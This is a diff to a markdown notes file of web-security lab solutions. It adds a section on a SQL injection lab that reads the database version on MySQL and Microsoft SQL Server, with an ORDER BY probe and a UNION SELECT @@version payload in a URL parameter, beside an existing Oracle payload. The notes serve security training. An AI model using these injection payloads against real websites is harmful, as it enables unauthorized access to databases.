@@ -374,6 +374,22 @@ Try to adapt this Payload:
 `GET /filter?category='UNION+SELECT+NULL,banner+FROM+v$version--`
 
 
+## SQL injection attack, querying the database type and version on MySQL and Microsoft
+
+> This lab contains an SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.
+> 
+> To solve the lab, display the database version string.
+
+### Approaches
+* Found hint in [Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
+* [Payload List](https://github.com/payloadbox/sql-injection-payload-list)
+
+
+### Solution
+1. `/filter?category='+ORDER+BY+2--+`
+2. `/filter?category='UNION+SELECT+@@version,NULL+--+`
+
+
 # Server-side request forgery (SSRF)
 
 # Authentication
